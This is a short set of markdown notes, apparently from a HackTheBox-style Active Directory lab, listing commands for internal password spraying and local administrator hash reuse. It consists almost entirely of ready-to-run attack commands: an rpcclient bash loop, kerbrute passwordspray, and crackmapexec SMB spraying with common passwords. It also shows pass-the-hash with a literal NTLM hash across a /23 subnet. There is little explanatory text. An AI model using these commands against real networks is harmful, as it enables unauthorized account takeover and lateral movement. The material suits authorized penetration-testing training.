
## <span style="color:yellow">Internal Password Spraying from a Linux Host</span>


#### Using a Bash one-liner for the Attack (RPCCLIENT)

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```


#### Using Kerbrute for the Attack

```shell
Sauuron@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

#### Crackmapexec

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

## <span style="color:yellow"> Local Administrator Password Reuse</span>

#### Local Admin Spraying With CrackMapExec

```shell
Sauuron@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

